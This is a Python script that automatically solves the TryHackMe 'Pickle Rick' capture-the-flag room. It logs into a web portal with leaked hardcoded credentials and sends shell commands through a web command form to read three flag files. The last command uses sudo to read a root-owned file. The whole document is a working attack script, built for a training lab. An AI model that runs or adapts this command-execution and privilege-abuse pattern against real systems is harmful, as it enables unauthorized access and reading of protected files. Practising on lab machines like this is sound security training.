import requests
from colorama import Fore
from colorama import Style
import re

ip = input("Please enter the IP of the Room VM (https://tryhackme.com/room/picklerick) : ")
url = "http://" + ip + "/login.php"
authenticated_url = "http://" + ip + "/portal.php"

data = "username=R1ckRul3s&password=Wubbalubbadubdub&sub=Login"

# username = "R1ckRul3s" # present in HTML comments for http://IP/
# password = "Wubbalubbadubdub" # present in http://IP/robots.txt

authenticated_data = "command=whoami&sub=Execute"
authenticated_data_flag1 = "command=less+Sup3rS3cretPickl3Ingred.txt&sub=Execute"
authenticated_data_flag2 = "command=less /home/rick/'second ingredients'&sub=Execute"
authenticated_data_flag3 = "command=sudo less /root/3rd.txt&sub=Execute"

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

print(f"{Fore.CYAN}[+] Trying Logging into the website with the supplied credentials{Style.RESET_ALL}")

s = requests.Session()
r = s.post(url, data=data, headers=headers)
str_to_check = "Rick Portal"

if str_to_check in r.text:
    print(f"{Fore.GREEN}[+] Authentication Successful{Style.RESET_ALL}")
    auth_req = s.post(authenticated_url, data=authenticated_data, headers=headers)

    auth_req_response = auth_req.text
    tag = "pre"
    reg_str = "<" + tag + ">(.*?)\n</" + tag + ">"
    res = re.findall(reg_str, auth_req_response)
    print(f"{Fore.CYAN}[+] Confirming Command Execution{Style.RESET_ALL}")
    if res:
        print(str(res))
    else:
        print(f"{Fore.RED}[-] Something went wrong, please try again{Style.RESET_ALL}")

    auth_req_flag1 = s.post(authenticated_url, data=authenticated_data_flag1, headers=headers)
    auth_req_flag1_response = auth_req_flag1.text
    res = re.findall(reg_str, auth_req_flag1_response)
    print(f"{Fore.CYAN}[+] Reading flag 1 for you :) {Style.RESET_ALL}")
    if res:
        print(str(res))
    else:
        print(f"{Fore.RED}[-] Something went wrong, please try again{Style.RESET_ALL}")
    
    auth_req_flag2 = s.post(authenticated_url, data=authenticated_data_flag2, headers=headers)
    auth_req_flag2_response = auth_req_flag2.text
    res = re.findall(reg_str, auth_req_flag2_response)
    print(f"{Fore.CYAN}[+] Reading flag 2 for you :) {Style.RESET_ALL}")
    if res:
        print(str(res))
    else:
        print(f"{Fore.RED}[-] Something went wrong, please try again{Style.RESET_ALL}")

    auth_req_flag3 = s.post(authenticated_url, data=authenticated_data_flag3, headers=headers)
    auth_req_flag3_response = auth_req_flag3.text
    res = re.findall(reg_str, auth_req_flag3_response)
    print(f"{Fore.CYAN}[+] Reading flag 3 for you :) {Style.RESET_ALL}")
    if res:
        print(str(res))
    else:
        print(f"{Fore.RED}[-] Something went wrong, please try again{Style.RESET_ALL}")

    print(f"{Fore.GREEN}[+] Congratulations on solving the room Pickle Rick.{Style.RESET_ALL}")
    
else:
    print(f"{Fore.RED}[-] Authentication failed, please check the credentials and try again{Style.RESET_ALL}")